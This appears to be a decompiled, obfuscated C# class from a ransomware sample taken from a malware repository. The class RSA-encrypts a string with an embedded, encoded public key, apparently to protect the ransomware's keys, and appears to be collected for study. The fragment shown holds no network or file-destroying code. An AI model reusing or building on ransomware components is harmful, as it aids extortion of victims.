// Decompiled with JetBrains decompiler
// Type: PMpBbYpvEb.VObDkPNSIzESE
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace PMpBbYpvEb
{
  public static class VObDkPNSIzESE
  {
    private static bool kMkuFenFmUW;
    private static readonly string vkIdOMxYDQuiM;
    [NonSerialized]
    internal static GetString \u0091;

    public static string NjZzWfIsqa([In] string obj0)
    {
      int mjgrtVkPhKnyU = 0;
      string ebJKhixfhwZxP = VObDkPNSIzESE.\u0091(107389548);
      VObDkPNSIzESE.cyNEDdNYJzRWE(VObDkPNSIzESE.vkIdOMxYDQuiM, out mjgrtVkPhKnyU, out ebJKhixfhwZxP);
      return Convert.ToBase64String(VObDkPNSIzESE.zDjAkBkPEnSsjjz(Encoding.UTF8.GetBytes(obj0), mjgrtVkPhKnyU, ebJKhixfhwZxP));
    }

    private static byte[] zDjAkBkPEnSsjjz([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(VObDkPNSIzESE.\u0091(107412116), VObDkPNSIzESE.\u0091(107412127));
      int num = VObDkPNSIzESE.tUAkOmvHzpI(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(VObDkPNSIzESE.\u0091(107412086), (object) num), VObDkPNSIzESE.\u0091(107412127));
      if (!VObDkPNSIzESE.YoQonaaSbpQNKi(obj1))
        throw new ArgumentException(VObDkPNSIzESE.\u0091(107412049), VObDkPNSIzESE.\u0091(107412020));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(VObDkPNSIzESE.\u0091(107412007), VObDkPNSIzESE.\u0091(107411978));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, VObDkPNSIzESE.kMkuFenFmUW);
      }
    }

    private static int tUAkOmvHzpI([In] int obj0) => VObDkPNSIzESE.kMkuFenFmUW ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool YoQonaaSbpQNKi([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void cyNEDdNYJzRWE(
      string XNNSPweQnyo,
      out int mjgrtVkPhKnyU,
      out string ebJKhixfhwZxP)
    {
      mjgrtVkPhKnyU = 0;
      ebJKhixfhwZxP = VObDkPNSIzESE.\u0091(107389548);
      if (XNNSPweQnyo == null || XNNSPweQnyo.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(XNNSPweQnyo));
      if (str.Contains(VObDkPNSIzESE.\u0091(107411993)))
      {
        string[] strArray = str.Split(new char[1]{ '!' }, 2);
        try
        {
          mjgrtVkPhKnyU = int.Parse(strArray[0]);
          ebJKhixfhwZxP = strArray[1];
        }
        catch (Exception ex)
        {
        }
      }
    }

    static VObDkPNSIzESE()
    {
      Strings.CreateGetStringDelegate(typeof (VObDkPNSIzESE));
      VObDkPNSIzESE.kMkuFenFmUW = false;
      VObDkPNSIzESE.vkIdOMxYDQuiM = VObDkPNSIzESE.\u0091(107411956);
    }
  }
}
